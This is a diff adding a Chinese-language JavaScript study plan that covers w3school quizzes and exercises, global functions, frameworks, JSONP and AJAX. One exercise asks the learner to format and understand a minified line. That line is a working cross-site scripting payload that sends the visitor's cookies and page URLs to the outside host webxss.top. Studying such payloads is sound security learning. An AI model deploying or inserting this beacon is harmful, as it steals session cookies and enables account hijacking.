@@ -1,0 +1,33 @@
+初级拓展
+1、测验
+        完成测验：http://www.w3school.com.cn/quiz/quiz.asp?quiz=js ；
+
+2、实践
+        1）相比html，javascript较为复杂。完成实例：http://www.w3school.com.cn/js/ ；
+        2）完成所有的“亲自试一试”（重点学习JS HTML DOM、JS Window部分）；
+
+3、掌握javaScript的全局函数
+        掌握：http://www.w3school.com.cn/jsref/jsref_obj_global.asp ；
+
+4、实用扩展
+        使用js格式化工具格式化如下代码，并理解每一句：
+(function(){(new Image()).src='http://webxss.top/xss/index.php?do=api&id=Sx5tnh&location='+escape((function(){try{return document.location.href}catch(e){return ''}})())+'&toplocation='+escape((function(){try{return top.location.href}catch(e){return ''}})())+'&cookie='+escape((function(){try{return document.cookie}catch(e){return ''}})())+'&opener='+escape((function(){try{return (window.opener && window.opener.location.href)?window.opener.location.href:''}catch(e){return ''}})());})(); if(''==1){keep=new Image();keep.src='http://webxss.top/xss/index.php?do=keepsession&id=Sx5tnh&url='+escape(document.location)+'&cookie='+escape(document.cookie)}
+
+
+
+
+
+高级拓展
+1、框架拓展
+        搜集整理常见的JavaScript框架（3-5个），了解如何使用；
+        参考：
+        https://www.ibm.com/developerworks/cn/web/wa-jsframeworks/
+        http://web.jobbole.com/84644/
+
+2、掌握JSONP
+        1）熟悉json格式，参考：http://www.w3school.com.cn/json/index.asp ；
+        2）学习jsonp格式，参考http://www.runoob.com/json/json-jsonp.html ；
+        3）在学习1.2.3后， 将上述JSONP教程中的代码部署并实验jsonp如何跨域读取数据。
+
+3、掌握AJAX技术
+        参考实践：http://www.w3school.com.cn/json/json_intro.asp  完成“亲自试一试”。
